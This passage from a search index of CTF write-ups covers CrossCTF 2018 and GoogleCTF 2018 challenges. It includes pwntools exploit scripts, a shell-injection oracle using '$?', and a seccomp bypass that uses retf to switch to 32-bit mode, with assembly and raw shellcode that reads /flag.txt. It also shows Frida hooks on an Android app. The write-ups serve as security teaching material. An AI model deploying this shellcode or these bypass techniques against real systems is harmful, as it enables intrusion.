0.","title":"Vulnerability"},{"location":"crossctf-quals2018/crypto/lossyoracle/#bitwise-or","text":"The property of a bitwise OR operation is that bits that are ON (equal to 1) will always stay ON, no matter what the bit is ORed with. This means, for each byte in the flag, for every single bit in them, as long as they are ON, no matter what key is used, they will always be ON after encryption. On the other hand, for bits in the flag that are OFF, sometimes, since the key is randomly generated, they may end up still being OFF after encryption. This means, we can take a lot different ciphertexts, and in at least one of them, the bits that are supposed to be OFF in the original flag must be OFF, since they definitely can't be ON forever, considering we are using a randomly generated key.","title":"Bitwise OR"},{"location":"crossctf-quals2018/crypto/lossyoracle/#bitwise-and","text":"Now, the property of a bitwise AND operation is that bits that are OFF (equal to 0) will always stay OFF, no matter what the bit is ANDed with. So, we can just apply the bitwise AND operation on many different ciphertexts together. How this works is that bits that are ON in the flag are ON forever regardless of the key, so even after applying bitwise AND on so many different ciphertexts they will still be ON. On the other hand, if we have many different ciphertexts, there must be at least one occurence where a bit that is originally OFF stays OFF, as the corresponding part of the key encrypting it may be OFF as well. By applying bitwise AND on all the ciphertexts together, this bit will be turned OFF. So, the final result would be a set of bytes, which has the same bits as the flag that are ON, and the same bits that are OFF, which is the flag!","title":"Bitwise AND"},{"location":"crossctf-quals2018/crypto/lossyoracle/#exploit","text":"","title":"Exploit"},{"location":"crossctf-quals2018/crypto/lossyoracle/#get-many-ciphertexts","text":"First thing we need is to automate the process of getting ciphertexts since we need A LOT of them. We can easily do it using pwntools. from pwn import * import base64 HOST = 'ctf.pwn.sg' PORT = 1401 r = remote(HOST, PORT) m = base64.b64decode(r.readall().strip().encode('utf-8')) assert len(m) == 14160 Along the way, we also convert the message to the correct encoding, and add a safety check to make sure the number of bytes received is always the same.","title":"Get many ciphertexts"},{"location":"crossctf-quals2018/crypto/lossyoracle/#and-them-all","text":"We can write a simple python function to do the bitwise AND between two strings for us. We initialize message to be a bunch of \\xff bytes, which means all bits in it are ON at the start. message = '\\xff' * 14160 def and_strings(s1, s2): return ''.join([chr(ord(s1[i]) & ord(s2[i])) for i in range(len(s1))])","title":"AND them all!"},{"location":"crossctf-quals2018/crypto/lossyoracle/#combining-all-together","text":"Our final solution is from pwn import * import base64 HOST = 'ctf.pwn.sg' PORT = 1401 message = '\\xff' * 14160 def and_strings(s1, s2): return ''.join([chr(ord(s1[i]) & ord(s2[i])) for i in range(len(s1))]) for i in range(500): print i r = remote(HOST, PORT) m = base64.b64decode(r.readall().strip().encode('utf-8')) assert len(m) == 14160 message = and_strings(message, m) open('flag', 'w').write(message) At first, I tried to read the flag on the terminal, but I get a bunch of unreadable bytes. I was confused and doubted my solution. But then, I remembered it was 14kb of data, sounds more likely to be a file. So, open('flag', 'w').write(message) was added to save the decrypted flag in a file.","title":"Combining all together"},{"location":"crossctf-quals2018/crypto/lossyoracle/#reading-the-flag","text":"While doing file flag , I get flag: MPEG ADTS, layer III, v2, 16 kbps, 24 kHz, Monaural A MPEG file! Play it using mpg123 flag and we get the flag!","title":"Reading the flag"},{"location":"crossctf-quals2018/pwn/evenflow/","text":"Even Flow - CrossCTF Quals 2018 (pwn) Do you like shell command injection? nc ctf.pwn.sg 1601 Creator - amon (@nn_amon) Challenge We are given a python script that is ran upon connection to the challenge server. Mainly, it reads in 2 strings. First, a string that is called \"flag\", and then another string consisting of only 2 bytes called \"shell\". sys.stdout.write(\"Flag: \") sys.stdout.flush() flag = sys.stdin.readline().strip() sys.stdout.write(\"Shell: \") sys.stdout.flush() shell = sys.stdin.read(2) The \"flag\" would be passed as an argument into the evenflow binary, while the \"shell\" is just being passed to echo . os.system(\"./evenflow \" + flag + \"; echo \\\"\" + shell + \"\\\"\"); We were also given the source of evenflow , which just reads the flag from a file, and performs strcmp on the \"flag\" that we passed in and the actual flag. size_t get_file_size(char * filename) { struct stat st; stat(filename, &st); return st.st_size; } int main(int argc, char ** argv) { FILE * fd = fopen(\"flag\", \"r\"); size_t file_size = get_file_size(\"flag\"); char * buffer = malloc(file_size); fread(buffer, 1, file_size, fd); return strcmp(buffer, argv[1]); } The interesting part of this code is the last line, return strcmp(buffer, argv[1]); According to documentation, strcmp will return a number that says how far the first differing character is away from each other. Exploit $? In a shell, $? contains the return value of the previous command. Since we are allowed to pass a string of 2 bytes to echo , we can just send in $? for \"shell\". So, we can call echo $? which will give us the return value of ./evenflow flag , which will let us know how far away is the first differing character from the actual flag. With this information, we can keep \"correcting\" our flag until we get the actual flag. Script We can write a script to automate this process. from pwn import * def tryf(flag): p = remote('ctf.pwn.sg', 1601) p.sendlineafter('Flag: ', flag) p.sendlineafter('Shell: ', '$?') # returns the return value of evenflow return int(p.recvline()) # The Idea: # Basically, we compare the actual flag to \"0\", # Then adjust it based on the output of strcmp (the exit code) # e.g. to \"C\", then add a \"0\" => \"C0\" # and repeat till we get \"}\", the end of the flag s = \"0\" while True: i = tryf(s) # adjust! c = chr(ord('0')+i) s = s[:-1] + c if s[-1] == '}': print(s) break s+='0'","title":"Even Flow"},{"location":"crossctf-quals2018/pwn/evenflow/#even-flow-crossctf-quals-2018-pwn","text":"Do you like shell command injection? nc ctf.pwn.sg 1601 Creator - amon (@nn_amon)","title":"Even Flow - CrossCTF Quals 2018 (pwn)"},{"location":"crossctf-quals2018/pwn/evenflow/#challenge","text":"We are given a python script that is ran upon connection to the challenge server. Mainly, it reads in 2 strings. First, a string that is called \"flag\", and then another string consisting of only 2 bytes called \"shell\". sys.stdout.write(\"Flag: \") sys.stdout.flush() flag = sys.stdin.readline().strip() sys.stdout.write(\"Shell: \") sys.stdout.flush() shell = sys.stdin.read(2) The \"flag\" would be passed as an argument into the evenflow binary, while the \"shell\" is just being passed to echo . os.system(\"./evenflow \" + flag + \"; echo \\\"\" + shell + \"\\\"\"); We were also given the source of evenflow , which just reads the flag from a file, and performs strcmp on the \"flag\" that we passed in and the actual flag. size_t get_file_size(char * filename) { struct stat st; stat(filename, &st); return st.st_size; } int main(int argc, char ** argv) { FILE * fd = fopen(\"flag\", \"r\"); size_t file_size = get_file_size(\"flag\"); char * buffer = malloc(file_size); fread(buffer, 1, file_size, fd); return strcmp(buffer, argv[1]); } The interesting part of this code is the last line, return strcmp(buffer, argv[1]); According to documentation, strcmp will return a number that says how far the first differing character is away from each other.","title":"Challenge"},{"location":"crossctf-quals2018/pwn/evenflow/#exploit","text":"","title":"Exploit"},{"location":"crossctf-quals2018/pwn/evenflow/#_1","text":"In a shell, $? contains the return value of the previous command. Since we are allowed to pass a string of 2 bytes to echo , we can just send in $? for \"shell\". So, we can call echo $? which will give us the return value of ./evenflow flag , which will let us know how far away is the first differing character from the actual flag. With this information, we can keep \"correcting\" our flag until we get the actual flag.","title":"$?"},{"location":"crossctf-quals2018/pwn/evenflow/#script","text":"We can write a script to automate this process. from pwn import * def tryf(flag): p = remote('ctf.pwn.sg', 1601) p.sendlineafter('Flag: ', flag) p.sendlineafter('Shell: ', '$?') # returns the return value of evenflow return int(p.recvline()) # The Idea: # Basically, we compare the actual flag to \"0\", # Then adjust it based on the output of strcmp (the exit code) # e.g. to \"C\", then add a \"0\" => \"C0\" # and repeat till we get \"}\", the end of the flag s = \"0\" while True: i = tryf(s) # adjust! c = chr(ord('0')+i) s = s[:-1] + c if s[-1] == '}': print(s) break s+='0'","title":"Script"},{"location":"crossctf-quals2018/pwn/impossible_shellcoding/","text":"Impossible Shellcoding - CrossCTF Quals 2018 (pwn) The flag is at /flag.txt. nc ctf.pwn.sg 7123 Creator - jarsp (@jarsp) Challenge Opening this up in radare2, we can get the following pseudocode. prctl(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)); prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &seccomp_rules, 0, 0); char* buffer = mmap(0x40404000, 0x1000, 7, 0x32); read(0, &buffer, 0x100); // runs the shellcode that was read into the buffer void (*func)() = buffer; func(); So, this is a shellcoding challenge, except that it is not so straightforward. There are 2 prctl calls that are designed to make our life difficult. The first one prevents us from running the program as other users, by blocking set-user-id and set-group-id functions. The second one sets up SECCOMP rules, which is a filter to block certain syscalls, based on the syscall number (K in the table below). Using seccomp-tools , we can get the following table. line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x00 0xc000003e /* no-op */ 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x0c 0x00 0x40000000 if (A >= 0x40000000) goto 0016 0004: 0x15 0x0b 0x00 0x00000002 if (A == open) goto 0016 0005: 0x15 0x0a 0x00 0x00000101 if (A == openat) goto 0016 0006: 0x15 0x09 0x00 0x00000055 if (A == creat) goto 0016 0007: 0x15 0x08 0x00 0x0000003b if (A == execve) goto 0016 0008: 0x15 0x07 0x00 0x00000039 if (A == fork) goto 0016 0009: 0x15 0x06 0x00 0x0000003a if (A == vfork) goto 0016 0010: 0x15 0x05 0x00 0x00000142 if (A == execveat) goto 0016 0011: 0x15 0x04 0x00 0x00000038 if (A == clone) goto 0016 0012: 0x15 0x03 0x00 0x00000065 if (A == ptrace) goto 0016 0013: 0x15 0x02 0x00 0x0000009d if (A == prctl) goto 0016 0014: 0x15 0x01 0x00 0x0000009e if (A == arch_prctl) goto 0016 0015: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0016: 0x06 0x00 0x00 0x00000000 return KILL SECCOMP We see that execve and execveat are blocked, which means no shell for us. Ok. As for ORW (open, read, write) capabilities, open and openat are blocked so we cannot do the typical procedure of open ing the file, read ing from the file into a buffer, then finally write ing the buffer into standard output. Great. fork / vfork / clone are blocked, so we can't create new processes that are free of these seccomp restrictions. There was a writeup on a similar challenge, which uses the x32 ABI . How this works is we can syscall 0x40000000 + syscall_num_you_actually_want to call the syscall and bypass seccomp, due to the x32 ABI of kernels. Sadly at line 0x003, any syscall greater than 0x40000000 is also blocked. So far, the major problem is that open() and its variants can't be used, however read / write are still available so we do not need to worry about that. There is another syscall called open_by_handle_at that I wanted to use, but for it to work the binary had to be root (I wasted 5 hours on this). retf However, there is still one more trick - executing 32-bit code instead. In 32-bit code, we can use 32-bit syscalls (which have different syscall numbers) to bypass the seccomp filter, as the seccomp filter only blocks the syscall based on its number. To run 32-bit code from 64-bit code, we can use the retf instruction which pops 2 values from the stack, the first being the next instruction address and the second being the new value of the CS (Code Segment) register. If the CS register becomes 0x33, it is executing 64-bit code, whereas if the CS register becomes 0x23, it is executing 32-bit code. One important thing to take note is, since 32-bit code can only read the lower 32-bits from 64-bit registers, we have to make sure we reset the registers the shellcode uses to lower values (including the instruction pointer register!). Exploit The exploit consists of two parts, firstly, 64-bit shellcode that does the following: 1. mmap with low addresses with RWX (read-write-exec) permissions 2. Read in 32-bit shellcode that opens the file and reads it into the mmap ed memory because the orginal binary only reads in 256 bytes - not enough! 3. retf to the mmap'ed memory to run the 32-bit shellcode mmap = ''' xor rax, rax mov al, 9 mov rdi, 0x602000 mov rsi, 0x1000 mov rdx, 7 mov r10, 0x32 mov r8, 0xffffffff mov r9, 0 syscall''' read = ''' mov rax, 0 xor rdi, rdi mov rsi, 0x602190 mov rdx, 100 syscall''' retf = ''' xor rsp, rsp mov esp, 0x602160 mov DWORD PTR [esp+4], 0x23 mov DWORD PTR [esp], 0x602190 retf ''' sc = mmap + read + retf f = asm(sc) p.sendline(f) The second step is just to send in 32-bit shellcode to read the flag. # Send 32-bit shellcode that open-reads the flag and writes to stdout # Copied from http://shell-storm.org/shellcode/files/shellcode-73.php p.sendline(\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\"+ \"\\xeb\\x32\\x5b\\xb0\\x05\\x31\\xc9\\xcd\"+ \"\\x80\\x89\\xc6\\xeb\\x06\\xb0\\x01\\x31\"+ \"\\xdb\\xcd\\x80\\x89\\xf3\\xb0\\x03\\x83\"+ \"\\xec\\x01\\x8d\\x0c\\x24\\xb2\\x01\\xcd\"+ \"\\x80\\x31\\xdb\\x39\\xc3\\x74\\xe6\\xb0\"+ \"\\x04\\xb3\\x01\\xb2\\x01\\xcd\\x80\\x83\"+ \"\\xc4\\x01\\xeb\\xdf\\xe8\\xc9\\xff\\xff\"+ \"\\xff\"+ \"/flag.txt\\x00\") Finally, print(p.recv()) to get the flag.","title":"Impossible Shellcoding"},{"location":"crossctf-quals2018/pwn/impossible_shellcoding/#impossible-shellcoding-crossctf-quals-2018-pwn","text":"The flag is at /flag.txt. nc ctf.pwn.sg 7123 Creator - jarsp (@jarsp)","title":"Impossible Shellcoding - CrossCTF Quals 2018 (pwn)"},{"location":"crossctf-quals2018/pwn/impossible_shellcoding/#challenge","text":"Opening this up in radare2, we can get the following pseudocode. prctl(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)); prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &seccomp_rules, 0, 0); char* buffer = mmap(0x40404000, 0x1000, 7, 0x32); read(0, &buffer, 0x100); // runs the shellcode that was read into the buffer void (*func)() = buffer; func(); So, this is a shellcoding challenge, except that it is not so straightforward. There are 2 prctl calls that are designed to make our life difficult. The first one prevents us from running the program as other users, by blocking set-user-id and set-group-id functions. The second one sets up SECCOMP rules, which is a filter to block certain syscalls, based on the syscall number (K in the table below). Using seccomp-tools , we can get the following table. line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x00 0xc000003e /* no-op */ 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x0c 0x00 0x40000000 if (A >= 0x40000000) goto 0016 0004: 0x15 0x0b 0x00 0x00000002 if (A == open) goto 0016 0005: 0x15 0x0a 0x00 0x00000101 if (A == openat) goto 0016 0006: 0x15 0x09 0x00 0x00000055 if (A == creat) goto 0016 0007: 0x15 0x08 0x00 0x0000003b if (A == execve) goto 0016 0008: 0x15 0x07 0x00 0x00000039 if (A == fork) goto 0016 0009: 0x15 0x06 0x00 0x0000003a if (A == vfork) goto 0016 0010: 0x15 0x05 0x00 0x00000142 if (A == execveat) goto 0016 0011: 0x15 0x04 0x00 0x00000038 if (A == clone) goto 0016 0012: 0x15 0x03 0x00 0x00000065 if (A == ptrace) goto 0016 0013: 0x15 0x02 0x00 0x0000009d if (A == prctl) goto 0016 0014: 0x15 0x01 0x00 0x0000009e if (A == arch_prctl) goto 0016 0015: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0016: 0x06 0x00 0x00 0x00000000 return KILL","title":"Challenge"},{"location":"crossctf-quals2018/pwn/impossible_shellcoding/#seccomp","text":"We see that execve and execveat are blocked, which means no shell for us. Ok. As for ORW (open, read, write) capabilities, open and openat are blocked so we cannot do the typical procedure of open ing the file, read ing from the file into a buffer, then finally write ing the buffer into standard output. Great. fork / vfork / clone are blocked, so we can't create new processes that are free of these seccomp restrictions. There was a writeup on a similar challenge, which uses the x32 ABI . How this works is we can syscall 0x40000000 + syscall_num_you_actually_want to call the syscall and bypass seccomp, due to the x32 ABI of kernels. Sadly at line 0x003, any syscall greater than 0x40000000 is also blocked. So far, the major problem is that open() and its variants can't be used, however read / write are still available so we do not need to worry about that. There is another syscall called open_by_handle_at that I wanted to use, but for it to work the binary had to be root (I wasted 5 hours on this).","title":"SECCOMP"},{"location":"crossctf-quals2018/pwn/impossible_shellcoding/#retf","text":"However, there is still one more trick - executing 32-bit code instead. In 32-bit code, we can use 32-bit syscalls (which have different syscall numbers) to bypass the seccomp filter, as the seccomp filter only blocks the syscall based on its number. To run 32-bit code from 64-bit code, we can use the retf instruction which pops 2 values from the stack, the first being the next instruction address and the second being the new value of the CS (Code Segment) register. If the CS register becomes 0x33, it is executing 64-bit code, whereas if the CS register becomes 0x23, it is executing 32-bit code. One important thing to take note is, since 32-bit code can only read the lower 32-bits from 64-bit registers, we have to make sure we reset the registers the shellcode uses to lower values (including the instruction pointer register!).","title":"retf"},{"location":"crossctf-quals2018/pwn/impossible_shellcoding/#exploit","text":"The exploit consists of two parts, firstly, 64-bit shellcode that does the following: 1. mmap with low addresses with RWX (read-write-exec) permissions 2. Read in 32-bit shellcode that opens the file and reads it into the mmap ed memory because the orginal binary only reads in 256 bytes - not enough! 3. retf to the mmap'ed memory to run the 32-bit shellcode mmap = ''' xor rax, rax mov al, 9 mov rdi, 0x602000 mov rsi, 0x1000 mov rdx, 7 mov r10, 0x32 mov r8, 0xffffffff mov r9, 0 syscall''' read = ''' mov rax, 0 xor rdi, rdi mov rsi, 0x602190 mov rdx, 100 syscall''' retf = ''' xor rsp, rsp mov esp, 0x602160 mov DWORD PTR [esp+4], 0x23 mov DWORD PTR [esp], 0x602190 retf ''' sc = mmap + read + retf f = asm(sc) p.sendline(f) The second step is just to send in 32-bit shellcode to read the flag. # Send 32-bit shellcode that open-reads the flag and writes to stdout # Copied from http://shell-storm.org/shellcode/files/shellcode-73.php p.sendline(\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\"+ \"\\xeb\\x32\\x5b\\xb0\\x05\\x31\\xc9\\xcd\"+ \"\\x80\\x89\\xc6\\xeb\\x06\\xb0\\x01\\x31\"+ \"\\xdb\\xcd\\x80\\x89\\xf3\\xb0\\x03\\x83\"+ \"\\xec\\x01\\x8d\\x0c\\x24\\xb2\\x01\\xcd\"+ \"\\x80\\x31\\xdb\\x39\\xc3\\x74\\xe6\\xb0\"+ \"\\x04\\xb3\\x01\\xb2\\x01\\xcd\\x80\\x83\"+ \"\\xc4\\x01\\xeb\\xdf\\xe8\\xc9\\xff\\xff\"+ \"\\xff\"+ \"/flag.txt\\x00\") Finally, print(p.recv()) to get the flag.","title":"Exploit"},{"location":"googlectf-quals2018/","text":"GoogleCTF Quals 2018 In this CTF we played with HATS Singapore and managed to solve only 4 challenges :'( Reversing Shall we play a game","title":"Overview"},{"location":"googlectf-quals2018/#googlectf-quals-2018","text":"In this CTF we played with HATS Singapore and managed to solve only 4 challenges :'(","title":"GoogleCTF Quals 2018"},{"location":"googlectf-quals2018/#reversing","text":"Shall we play a game","title":"Reversing"},{"location":"googlectf-quals2018/re/shallweplayagame/","text":"GoogleCTF Quals 2018 : Shall we play a game (re, 113 points, 111 solves) Summary We are given an android app with a tic tac toe game. To obtain the flag, we need to win 1000000 times. Static Analysis Solution Static Analysis The first thing I always do when getting an apk file (from a trusted source, of course) is to install it, to see what it is about. Since I have an Android device, it is very convenient for me to just use adb. $ adb install app.apk Decompilation First, I used jadx to decompile the app and view its source. Looking at AndroidManifest.xml, we see that GameActivity is the activity being launched at the start. ... <application android:theme=\"@style/AppTheme\" android:label=\"@string/app_name\" android:icon=\"@mipmap/ic_launcher\" android:name=\"android.support.multidex.MultiDexApplication\" android:allowBackup=\"true\" android:supportsRtl=\"true\" android:roundIcon=\"@mipmap/ic_launcher_round\"> <activity android:name=\"com.google.ctf.shallweplayagame.GameActivity\"> ... In GameActivity.java, the function I'm interested in at the start is onClick and onCreate . Nothing much happens in onCreate , just some initialization. As for onClick , looks like it is performing some game logic. Here's the code (variables and functions/methods are renamed by myself, if you want to look at the original source, it is here ). public void onClick(View view) { if (!this.hasLost && this.animatorsQueue.isEmpty()) { CellView cellView = (CellView) view; if (cellView.isEmpty())) { soundController.playToneA(); cellValue.setValue(CellView.X); if (won(CellView.X)) { updateScore(); return; } List l = getListOfNonEmptyCells(); if (l.isEmpty()) { updateScore(); return; } getRandomElement(l).setValue(a.O); if (won(a.O)) { lost(); return; } else { animate(); return; } } soundController.playToneB(); } } protected void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView((int) R.layout.activity_game); LinearLayout linearLayout = (LinearLayout) findViewById(R.id.rows); for (int i = 0; i < 3; i++) { View linearLayout2 = new LinearLayout(getApplicationContext()); for (int i2 = 0; i2 < 3; i2++) { View cell = new CellView(getApplicationContext(), this.m); linearLayout2.addView(cell); this.l[i2][i] = cell; cell.setOnClickListener(this); } linearLayout.addView(linearLayout2); } } There's nothing interesting in animate and lost , but updateScore seems to have something more than just updating the score. In particular, a list byteArray1 is modifed during every call to updateScore , and I suspect this should contain the flag in some form. And when our score reaches 1,000,000, showFlag is invoked. void updateScore() { for (int i = 0; i < 3; i++) { for (int i2 = 0; i2 < 3; i2++) { this.l[i2][i].setCellValue(a.EMPTY, 25); } } animate(); this.score++; Object _ = N._(Integer.valueOf(2), N.e, Integer.valueOf(2)); N._(Integer.valueOf(2), N.f, _, this.byteArray1); this.byteArray1 = (byte[]) N._(Integer.valueOf(2), N.g, _); if (this.score == 1000000) { showFlag(); return; } ((TextView) findViewById(R.id.score)).setText(String.format(\"%d / %d\", new Object[]{Integer.valueOf(this.score), Integer.valueOf(1000000)})); } Here, the app prints the flag, using values derived from byteArray1 and byteArray2 . void showFlag() { Object _ = N._(Integer.valueOf(0), N.a, Integer.valueOf(0)); Object _2 = N._(Integer.valueOf(1), N.b, this.byteArray1, Integer.valueOf(1)); N._(Integer.valueOf(0), N.c, _, Integer.valueOf(2), _2); ((TextView) findViewById(R.id.score)).setText(new String((byte[]) N._(Integer.valueOf(0), N.d, _, this.byteArray2))); o(); } Lots of variables from the N class are being referenced. Taking a peek at it tells us they are different constants. But something catches our eye, the native function _ . package com.google.ctf.shallweplayagame; class N { static final int[] a = new int[]{0, 1, 0}; static final int[] b = new int[]{1, 0, 2}; static final int[] c = new int[]{2, 0, 1}; static final int[] d = new int[]{3, 0, 0}; static final int[] e = new int[]{4, 1, 0}; static final int[] f = new int[]{5, 0, 1}; static final int[] g = new int[]{6, 0, 0}; static final int[] h = new int[]{7, 0, 2}; static final int[] i = new int[]{8, 0, 1}; static { System.loadLibrary(\"rary\"); } static native Object _(Object... objArr); } Native library To obtain the native library shared object file, I used apktool to disassemble the app. apktool gives smali files, but also contains shared object files, whereas jadx gives java files but there is no shared object file $ java -jar ~/Downloads/apktool_2.3.3.jar d auto_solve.apk Opening up the shared object file in IDA, my immediate thought is to not reverse it. Because _ was an overloaded function, it seems like the native function does some type checking on the arguments before performing more complex operations on it, which involves a lot of other functions. Solution Clearly, what we need to do now is to run updateScore() 1,000,000 times. There are a few ways to this. Patching the smali file and build it back to an apk file, then install it. Create a new Android project in Android Studio, and manually add all the relevant files, including native libraries, so this will be somewhat troublesome. Use frida to hook onCreate and run updateScore() directly from there. Why can't we just edit the .java file and build it directly? Because jadx decompiles the apk file, which means code is reconstructed using some heuristics, and does not preserve the project structure used by Android projects. So, we need to create a new Android project ourselves and add in all the stuff needed manually. On the other hand, apktool disassembles the apk file, which means it does not do any code generation by itself, preserving the project structure so it can easily build a patched apk file from that. Using Frida I decided to use Frida as I didn't really feel like messing with the smali code at the time (wasn't very hard actually, someone else in the team did it). I figured the most convenient way to do it is to hook onCreate , let it initialize the stuff it needs, and then call n() 1000000 times from there. ( n is the original function name of updateScore , m is showFlag ) frida uses javascript to do instrumentation Java.perform(function() { var GameActivity = Java.use('com.google.ctf.shallweplayagame.GameActivity'); GameActivity.onCreate.overload('android.os.Bundle').implementation = function (v) { this.onCreate(v) for (var i = o; i < 1000000; i++) { send(i); this.n(); } }; }) Then, set up a Frida python script to run it. def on_message(message, data): global i, q, changed if message['type'] == 'send': print(\"[*] {0}\".format(message['payload'])) print('[*] Spawning app') device = frida.get_usb_device() pid = device.spawn('com.google.ctf.shallweplayagame') session = device.attach(pid) jscode = open('script.js', 'r').read() script = session.create_script(jscode) script.on('message', on_message) print('[*] Running script') script.load() device.resume(pid) All looks good... until when it reaches around 10000 the app crashes. I suppose maybe using such a hooking approach may mess up garbage collection in the app, causing it to run out of memory. Spawn app repeatedly However, this is rather simply to deal with. I modified the js script to only run n() up to 10000 times, then dump the values of score and byteArray1 , and store them in a global variable. Then, re-run the app and load those values into score and byteArray1 to continue where we ended off. i = 0 q = [] def on_message(message, data): global i, q, changed if message['type'] == 'send': print(\"[*] {0}\".format(message['payload'])) i = message['payload'][0] q = message['payload'][1] changed = True Using a while loop, we can keep spawning the app until we get the flag. while True: if i > 1000000: exit(0) while not changed: pass changed = False jscode = \"\"\" Java.perform(function() { var GameActivity = Java.use('com.google.ctf.shallweplayagame.GameActivity'); o = %d GameActivity.onCreate.overload('android.os.Bundle').implementation = function (v) { this.onCreate(v) %s if (o < 1000000) { for (var i = o; i < o + 20000; i++) { this.n(); } send([i, this.q.value]); } else { this.m(); } }; GameActivity.k.implementation = function () { }; }) \"\"\" % (i, \"this.q.value = Java.array('byte', %s)\" % q if i > 0 else '') print('Spawning app') device = frida.get_usb_device() pid = device.spawn('com.google.ctf.shallweplayagame') session = device.attach(pid) script = session.create_script(jscode) script.on('message', on_message) print('[*] Running script') script.load() device.resume(pid) Full script here . Flag This approach was really slow, it took around half an hour to finally get the flag. In contrast, if I'd just modified the smali code, it would have been complete in less than a second. Nevertheless, I still preferred this solution as it is very easy to code. Then, I can just leave the script to run while doing some other stuff, and come back half an hour to get the flag. Unless I'm familiar with smali, it would have taken some brain effort to modify the code to get the flag.","title":"Shall we play a game"},{"location":"googlectf-quals2018/re/shallweplayagame/#googlectf-quals-2018-shall-we-play-a-game-re-113-points-111-solves","text":"","title":"GoogleCTF Quals 2018 : Shall we play a game (re, 113 points, 111 solves)"},{"location":"googlectf-quals2018/re/shallweplayagame/#summary","text":"We are given an android app with a tic tac toe game. To obtain the flag, we need to win 1000000 times. Static Analysis Solution","title":"Summary"},{"location":"googlectf-quals2018/re/shallweplayagame/#static-analysis","text":"The first thing I always do when getting an apk file (from a trusted source, of course) is to install it, to see what it is about. Since I have an Android device, it is very convenient for me to just use adb. $ adb install app.apk","title":"Static Analysis"},{"location":"googlectf-quals2018/re/shallweplayagame/#decompilation","text":"First, I used jadx to decompile the app and view its source. Looking at AndroidManifest.xml, we see that GameActivity is the activity being launched at the start. ... <application android:theme=\"@style/AppTheme\" android:label=\"@string/app_name\" android:icon=\"@mipmap/ic_launcher\" android:name=\"android.support.multidex.MultiDexApplication\" android:allowBackup=\"true\" android:supportsRtl=\"true\" android:roundIcon=\"@mipmap/ic_launcher_round\"> <activity android:name=\"com.google.ctf.shallweplayagame.GameActivity\"> ... In GameActivity.java, the function I'm interested in at the start is onClick and onCreate . Nothing much happens in onCreate , just some initialization. As for onClick , looks like it is performing some game logic. Here's the code (variables and functions/methods are renamed by myself, if you want to look at the original source, it is here ). public void onClick(View view) { if (!this.hasLost && this.animatorsQueue.isEmpty()) { CellView cellView = (CellView) view; if (cellView.isEmpty())) { soundController.playToneA(); cellValue.setValue(CellView.X); if (won(CellView.X)) { updateScore(); return; } List l = getListOfNonEmptyCells(); if (l.isEmpty()) { updateScore(); return; } getRandomElement(l).setValue(a.O); if (won(a.O)) { lost(); return; } else { animate(); return; } } soundController.playToneB(); } } protected void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView((int) R.layout.activity_game); LinearLayout linearLayout = (LinearLayout) findViewById(R.id.rows); for (int i = 0; i < 3; i++) { View linearLayout2 = new LinearLayout(getApplicationContext()); for (int i2 = 0; i2 < 3; i2++) { View cell = new CellView(getApplicationContext(), this.m); linearLayout2.addView(cell); this.l[i2][i] = cell; cell.setOnClickListener(this); } linearLayout.addView(linearLayout2); } } There's nothing interesting in animate and lost , but updateScore seems to have something more than just updating the score. In particular, a list byteArray1 is modifed during every call to updateScore , and I suspect this should contain the flag in some form. And when our score reaches 1,000,000, showFlag is invoked. void updateScore() { for (int i = 0; i < 3; i++) { for (int i2 = 0; i2 < 3; i2++) { this.l[i2][i].setCellValue(a.EMPTY, 25); } } animate(); this.score++; Object _ = N._(Integer.valueOf(2), N.e, Integer.valueOf(2)); N._(Integer.valueOf(2), N.f, _, this.byteArray1); this.byteArray1 = (byte[]) N._(Integer.valueOf(2), N.g, _); if (this.score == 1000000) { showFlag(); return; } ((TextView) findViewById(R.id.score)).setText(String.format(\"%d / %d\", new Object[]{Integer.valueOf(this.score), Integer.valueOf(1000000)})); } Here, the app prints the flag, using values derived from byteArray1 and byteArray2 . void showFlag() { Object _ = N._(Integer.valueOf(0), N.a, Integer.valueOf(0)); Object _2 = N._(Integer.valueOf(1), N.b, this.byteArray1, Integer.valueOf(1)); N._(Integer.valueOf(0), N.c, _, Integer.valueOf(2), _2); ((TextView) findViewById(R.id.score)).setText(new String((byte[]) N._(Integer.valueOf(0), N.d, _, this.byteArray2))); o(); } Lots of variables from the N class are being referenced. Taking a peek at it tells us they are different constants. But something catches our eye, the native function _ . package com.google.ctf.shallweplayagame; class N { static final int[] a = new int[]{0, 1, 0}; static final int[] b = new int[]{1, 0, 2}; static final int[] c = new int[]{2, 0, 1}; static final int[] d = new int[]{3, 0, 0}; static final int[] e = new int[]{4, 1, 0}; static final int[] f = new int[]{5, 0, 1}; static final int[] g = new int[]{6, 0, 0}; static final int[] h = new int[]{7, 0, 2}; static final int[] i = new int[]{8, 0, 1}; static { System.loadLibrary(\"rary\"); } static native Object _(Object... objArr); }","title":"Decompilation"},{"location":"googlectf-quals2018/re/shallweplayagame/#native-library","text":"To obtain the native library shared object file, I used apktool to disassemble the app. apktool gives smali files, but also contains shared object files, whereas jadx gives java files but there is no shared object file $ java -jar ~/Downloads/apktool_2.3.3.jar d auto_solve.apk Opening up the shared object file in IDA, my immediate thought is to not reverse it. Because _ was an overloaded function, it seems like the native function does some type checking on the arguments before performing more complex operations on it, which involves a lot of other functions.","title":"Native library"},{"location":"googlectf-quals2018/re/shallweplayagame/#solution","text":"Clearly, what we need to do now is to run updateScore() 1,000,000 times. There are a few ways to this. Patching the smali file and build it back to an apk file, then install it. Create a new Android project in Android Studio, and manually add all the relevant files, including native libraries, so this will be somewhat troublesome. Use frida to hook onCreate and run updateScore() directly from there. Why can't we just edit the .java file and build it directly? Because jadx decompiles the apk file, which means code is reconstructed using some heuristics, and does not preserve the project structure used by Android projects. So, we need to create a new Android project ourselves and add in all the stuff needed manually. On the other hand, apktool disassembles the apk file, which means it does not do any code generation by itself, preserving the project structure so it can easily build a 